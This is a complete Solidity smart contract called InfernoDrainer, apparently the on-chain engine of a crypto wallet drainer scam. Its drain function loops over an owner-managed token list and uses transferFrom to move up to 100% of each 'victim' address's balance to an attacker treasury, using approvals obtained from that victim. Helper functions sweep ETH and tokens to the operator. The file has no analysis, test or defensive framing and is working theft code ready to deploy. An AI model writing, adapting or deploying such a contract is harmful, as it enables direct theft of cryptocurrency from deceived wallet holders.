// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

contract InfernoDrainer {
    address public owner;
    address public treasury;

    address[] public tokens;
    mapping(address => bool) public isToken;
    uint256 public takeBps; // 10000 = 100%

    event TokenAdded(address indexed token);
    event TokenRemoved(address indexed token);
    event TreasuryUpdated(address indexed newTreasury);
    event TakeUpdated(uint256 newTakeBps);
    event DrainStarted(address indexed victim);
    event TokenDrained(address indexed victim, address indexed token, uint256 amount);
    event EthSwept(uint256 amount);
    event TokenRescued(address indexed token, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _treasury) {
        require(_treasury != address(0), "zero treasury");
        owner = msg.sender;
        treasury = _treasury;
        takeBps = 10000;
    }

    function addToken(address token) external onlyOwner {
        require(token != address(0), "zero token");
        require(!isToken[token], "already added");
        isToken[token] = true;
        tokens.push(token);
        emit TokenAdded(token);
    }

    function removeToken(address token) external onlyOwner {
        require(isToken[token], "not a token");
        isToken[token] = false;
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == token) {
                tokens[i] = tokens[tokens.length - 1];
                tokens.pop();
                break;
            }
        }
        emit TokenRemoved(token);
    }

    function setTreasury(address _treasury) external onlyOwner {
        require(_treasury != address(0), "zero treasury");
        treasury = _treasury;
        emit TreasuryUpdated(_treasury);
    }

    function setTakeBps(uint256 _takeBps) external onlyOwner {
        require(_takeBps <= 10000, "take > 100%");
        takeBps = _takeBps;
        emit TakeUpdated(_takeBps);
    }

    function tokenCount() external view returns (uint256) {
        return tokens.length;
    }

    function drain(address victim) external onlyOwner {
        require(victim != address(0), "zero victim");
        emit DrainStarted(victim);
        uint256 len = tokens.length;
        for (uint256 i = 0; i < len; i++) {
            address token = tokens[i];
            IERC20 t = IERC20(token);
            uint256 bal = t.balanceOf(victim);
            if (bal == 0) continue;
            uint256 amount = (bal * takeBps) / 10000;
            if (amount == 0) continue;
            (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(
                IERC20.transferFrom.selector, victim, treasury, amount
            ));
            require(ok && (data.length == 0 || abi.decode(data, (bool))), "drain failed");
            emit TokenDrained(victim, token, amount);
        }
    }

    function sweepETH() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "no eth to sweep");
        (bool ok, ) = treasury.call{value: bal}("");
        require(ok, "eth sweep failed");
        emit EthSwept(bal);
    }

    function rescue(address token, address to, uint256 amount) external onlyOwner {
        IERC20 t = IERC20(token);
        uint256 bal = amount == 0 ? t.balanceOf(address(this)) : amount;
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(
            IERC20.transfer.selector, to, bal
        ));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "rescue failed");
        emit TokenRescued(token, to, bal);
    }

    receive() external payable {}
}
